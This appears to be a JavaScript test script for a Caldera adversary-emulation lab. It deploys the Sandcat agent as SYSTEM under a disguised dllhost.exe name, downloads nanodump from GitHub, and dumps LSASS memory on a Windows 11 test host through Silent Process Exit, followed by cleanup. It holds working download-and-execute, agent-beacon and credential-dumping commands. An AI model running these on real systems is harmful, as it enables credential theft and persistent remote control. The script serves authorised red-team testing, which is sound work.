import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const KALI_SSH = "kali:kali"
const WINRM_AUTH = "localuser:password"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

// ─── Existing Building Blocks ───────────────────────────────────────────────

async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

// ─── Connectivity Tests ─────────────────────────────────────────────────────

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Prereq Command Execution Tests ──────────────────────────────────────────

async function testSshPrereq() {
  console.log("\n=== SSH Prereq Execution ===")
  try {
    const output = await sshRun(KALI_IP, "kali", "kali", "mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && ls $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/")
    console.log(`  PASS: ExternalPayloads = ${output || "(empty)"}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmPrereq() {
  console.log("\n=== WinRM Prereq Execution ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "ver")
    console.log(`  PASS: "ver" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Sandcat Agent Deployment Test ──────────────────────────────────────────

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  try {
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    console.log("\n  [2] Download sandcat.go → C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
    const taskName = `CalderaSandcat-${group}`
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

// ─── Full Pipeline Integration Test ──────────────────────────────────────────

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Dump LSASS.exe Memory through Silent Process Exit ===")

  const abilityId = "505f7b839938e8cea8db2dc9a4448f57"
  const abilityName = "Dump LSASS.exe Memory through Silent Process Exit"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  const kaliPrereq = `if [ -f "\\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe" ]; then echo "ALREADY_PRESENT: \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe"; else mkdir -p \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget -q "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -O \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && sudo systemctl restart caldera; fi`

  let agentPaw = null

  try {
    // ── Step 1: Clean slate ──
    console.log("\n  [1/6] Cleaning previous agents, processes, and tasks...")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: Install prereqs on Kali ──
    console.log("\n  [2/6] Running kali prereq (nanodump download + Caldera restart)...")
    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
    console.log(`    => ${prereqResult.slice(0, 200)}`)
    if (!prereqResult.includes("ALREADY_PRESENT")) {
      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
      const start = Date.now()
      while (Date.now() - start < 120000) {
        try {
          await calderaRest("POST", { index: "agents" })
          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
          break
        } catch {}
        await new Promise(r => setTimeout(r, 1000))
      }
    }

    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    // ── Step 4: Wait for agent + fetch ability + deploy payload ──
    console.log(`\n  [4/6] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [4b/6] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
    console.log(`    => original command: ${ability.executors[0].command}`)

    // ── Step 4c: Deploy nanodump.x64.exe to Windows ──
    console.log(`\n  [4c/6] Deploying nanodump.x64.exe to Windows...`)
    const binaryName = "nanodump.x64.exe"
    const destPath = `C:\\Users\\Public\\${binaryName}`
    console.log(`    => Payload: ${binaryName}`)
    const check = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "if (Test-Path '${destPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
    if (check.includes("MISSING")) {
      console.log(`    => Downloading from GitHub (fortra/nanodump)...`)
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe' -OutFile '${destPath}'; Write-Host 'DEPLOYED'"`)
    } else {
      console.log(`    => Already present at ${destPath}`)
    }
    // Verify file size
    const verify = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$f=Get-Item '${destPath}' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""`)
    console.log(`    => ${verify.trim()}`)

    // ── Step 5: Modify ability command + exploit ──
    console.log(`\n  [5/6] Exploiting agent with ability...`)

    const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
    const modified = structuredClone(original)
    const oldCmd = modified.executors[0].command
    // Path is unquoted unlike Procdump: "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ..."
    modified.executors[0].command = oldCmd.replace(
      /PathToAtomicsFolder[^\s]*nanodump\.x64\.exe/,
      `C:\\Users\\Public\\nanodump.x64.exe`
    )
    console.log(`    => Command: "${oldCmd.slice(0, 60)}..." → "${modified.executors[0].command.slice(0, 60)}..."`)

    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
    console.log(`    => Ability command updated`)

    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    // Wait for link to appear
    console.log(`    => Waiting for link (120s timeout)...`)
    let linkFacts = []
    let linkStatus = null
    const pollStart = Date.now()
    while (Date.now() - pollStart < 120000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
        if (mine.finish != null) {
          console.log(`    Command: ${mine.command}`)
          console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
          console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
          console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
          linkStatus = mine.status
          linkFacts = mine.facts || []
          break
        }
        console.log(`    Link pending (status=${mine.status}), waiting...`)
      }
      await new Promise(r => setTimeout(r, 2000))
    }

    // Restore ability command
    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, original)
    console.log(`\n    => Ability command restored`)

    // ── Step 6: Verify dump file ──
    console.log(`\n  [6/6] Verifying dump file in C:\\Windows\\Temp\\SilentProcessExit...`)
    let dumpExists = false
    let dumpSize = ""
    try {
      // nanodump --silent-process-exit sets up WerFault to dump lsass.exe into the specified directory.
      // WerFault creates lsass.exe.<PID>.dmp inside a subdirectory of C:\Windows\Temp\SilentProcessExit
      const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$dir = \'C:\\Windows\\Temp\\SilentProcessExit\'; if (Test-Path $dir) { $files = Get-ChildItem $dir -Recurse -Filter *.dmp -ErrorAction SilentlyContinue; if ($files) { $f = $files | Sort-Object Length -Descending | Select-Object -First 1; Write-Host \\"FOUND_DUMP $([math]::Round($f.Length/1024/1024,1))MB name=$($f.Name) count=$($files.Count)\\" } else { $all = Get-ChildItem $dir -Recurse -ErrorAction SilentlyContinue; Write-Host \\"NO_DMP_FILES items_in_dir=$($all.Count)\\" } } else { Write-Host \\"DIR_MISSING\\" }"')
      dumpExists = dumpCheck.includes("FOUND_DUMP")
      dumpSize = dumpCheck.match(/FOUND_DUMP (\S+)/)?.[1] || ""
      console.log(`    => Dump file: ${dumpCheck.trim()}`)
    } catch (err) {
      console.log(`    => Dump file check failed: ${err.message}`)
    }

    // If dump not found by filename pattern, list all files in the directory for diagnostics
    if (!dumpExists) {
      try {
        const dirList = await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "$dir = \'C:\\Windows\\Temp\\SilentProcessExit\'; if (Test-Path $dir) { Get-ChildItem $dir -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \\"$($_.FullName) ($([math]::Round($_.Length/1024,1))KB)\\" } } else { Write-Host \'DIR_MISSING\' }"')
        console.log(`    => Directory contents:\n${dirList.split('\n').map(l => `       ${l.trim()}`).join('\n')}`)
      } catch {}
    }

    for (const f of linkFacts.slice(0, 10)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }

    const passed = dumpExists
    const reason = dumpExists ? `dump ${dumpSize}` : linkFacts.length > 0 ? `${linkFacts.length} facts (no dump file)` : "no dump file or facts"
    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (link status=${linkStatus}, ${reason})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    // ── Cleanup: always run, best-effort ──
    console.log("\n  [cleanup] Removing agent, task, process, dump files, and SilentProcessExit dir...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    try {
      // Delete nanodump binary from C:\Users\Public
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Users\\Public\\nanodump.x64.exe\' -Force -ErrorAction SilentlyContinue; Write-Host \'BINARY_DELETED\'"')
      console.log("    nanodump binary deleted")
    } catch {}
    try {
      // Clean up dump directory and all files inside
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\SilentProcessExit\' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_DIR_DELETED\'"')
      console.log("    dump directory deleted")
    } catch {}
    // Also clean up Silent Process Exit registry keys if they remain
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host \'REG_CLEANED\'"')
      console.log("    silent process exit registry key cleaned")
    } catch {}
    console.log("    => cleanup complete")
  }
}

// ─── Console Logging Reference ──────────────────────────────────────────────

//   === Full Pipeline: Dump LSASS.exe Memory through Silent Process Exit ===
//   [1/6] Cleaning previous agents, processes, and tasks...
//   [2/6] Running kali prereq (nanodump download + Caldera restart)...
//   [3/6] Deploying sandcat as SYSTEM (group=test-...)
//   [4/6] Waiting for agent (group=test-...)
//   [4b/6] Fetching ability "Dump LSASS.exe Memory through Silent Process Exit"
//   [4c/6] Deploying nanodump.x64.exe to Windows...
//   [5/6] Exploiting agent with ability...
//   [6/6] Verifying dump file in C:\Windows\Temp\SilentProcessExit...
//   [cleanup] Removing agent, task, process, dump files, and SilentProcessExit dir...

// ─── Ability Specifics ──────────────────────────────────────────────────────

//   - nanodump.x64.exe uses Silent Process Exit mechanism (WerFault.exe) to dump LSASS
//   - Sets HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe
//   - Terminates lsass.exe via NtTerminateProcess; WerFault.exe creates the dump
//   - lsass.exe automatically restarts on Windows 10/11 (Service Failure Actions)
//   - Dump output: %temp%\SilentProcessExit\lsass.exe.<PID>.dmp (C:\Windows\Temp\SilentProcessExit\)
//   - kali_prereq: downloads nanodump.x64.exe from GitHub (fortra/nanodump), restarts Caldera
//   - win_prereq: none
//   - Command PathToAtomicsFolder replaced with C:\Users\Public\nanodump.x64.exe
//   - No EULA acceptance needed (unlike ProcDump)
//   - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege to access LSASS
//   - Cleanup removes binary, dump directory, and Silent Process Exit registry keys

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log("testAbility — Nanodump Silent Process Exit LSASS Dumper Test\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sshPrereq: await testSshPrereq(),
    winrmPrereq: await testWinrmPrereq(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed`)
  console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
  console.log(`  Full pipeline test: agentWait → abilityLookup → payloadDeploy → abilityExploit → dumpVerify → cleanup`)
  console.log(`\n  Silent Process Exit ability specifics:`)
  console.log(`    - nanodump.x64.exe abuses WerFault.exe via Silent Process Exit registry mechanism`)
  console.log(`    - Dump file: C:\\Windows\\Temp\\SilentProcessExit\\lsass.exe.<PID>.dmp`)
  console.log(`    - kali_prereq downloads nanodump from GitHub, restarts Caldera`)
  console.log(`    - nanodump deployed to C:\\Users\\Public\\ on Windows for direct execution`)
  console.log(`    - PathToAtomicsFolder replaced with local binary path (unquoted, unlike Procdump)`)
  console.log(`    - No EULA acceptance needed`)
  console.log(`    - Cleanup removes registry keys to prevent unintended dumps`)
}

main().catch(console.error)
